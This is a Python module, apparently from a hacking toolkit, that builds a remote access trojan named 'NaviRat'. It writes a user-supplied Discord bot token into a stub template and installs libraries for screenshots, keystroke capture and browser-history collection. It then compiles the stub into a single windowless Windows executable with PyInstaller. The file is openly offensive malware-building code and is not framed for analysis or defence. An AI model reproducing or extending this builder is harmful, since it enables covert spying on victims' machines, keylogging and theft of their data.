import os, sys, subprocess, shutil, time
from core.display import Colors, Colorate, get_inpt, Theme, print_banner

def rat_builder_init():
    _cl = Theme.get_colors()
    print_banner()
    print(Colorate.Horizontal(_cl["head"], "  [ RAT BUILDER ]\n"))

    token = get_inpt("Enter Discord Bot Token:")
    if not token:
        print(Colorate.Horizontal(_cl["num"], "  [!] No token provided. Aborting."))
        time.sleep(2)
        return

    stub_template = "modules/stub/rat_stub.txt"
    if not os.path.exists(stub_template):
        print(Colorate.Horizontal(_cl["num"], f"  [!] Stub template not found: {stub_template}"))
        time.sleep(2)
        return

    try:
        if not os.path.exists("build"): 
            os.makedirs("build")
        
        temp_stub = "build/stub_temp.py"

        with open(stub_template, "r", encoding="utf-8") as f:
            content = f.read()

        if "token = ''" in content:
            content = content.replace("token = ''", f"token = '{token}'")
        else:
            lines = content.splitlines()
            while len(lines) < 47: 
                lines.append("")
            lines[46] = f"token = '{token}'"
            content = "\n".join(lines)

        with open(temp_stub, "w", encoding="utf-8") as f:
            f.write(content)

        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into stub."))

        print(Colorate.Horizontal(_cl["txt"], "  [*] Preparing dependencies..."))
        subprocess.check_call([sys.executable, "-m", "pip", "install", "comtypes", "pycaw", "pyautogui", "browserhistory", "mss", "pynput", "discord.py", "requests", "pywin32", "-q"])

        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling RAT (Bundling all modules)..."))
        
        output_dir = os.path.join(os.getcwd(), "output")
        if not os.path.exists(output_dir): 
            os.makedirs(output_dir)

        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--distpath", output_dir,
            "--workpath", "build",
            "--specpath", "build",
            "--name", "NaviRat",
            temp_stub
        ]

        process = subprocess.run(cmd, capture_output=True, text=True)

        if process.returncode == 0:
            print(Colorate.Horizontal(_cl["head"], f"  [+] Build successful! All modules packed."))
            print(Colorate.Horizontal(_cl["head"], f"  [+] EXE located in: {output_dir}/NaviRat.exe"))
        else:
            print(Colorate.Horizontal(_cl["num"], "  [-] Build failed!"))

        print(Colorate.Horizontal(_cl["txt"], "  [*] Cleaning up build files..."))
        
        input(Colorate.Horizontal(_cl["head"], "\n  Press Enter to return..."))

    except Exception as e:
        print(Colorate.Horizontal(_cl["num"], f"  [-] An error occurred: {str(e)}"))
        time.sleep(3)

if __name__ == "__main__":
    rat_builder_init()
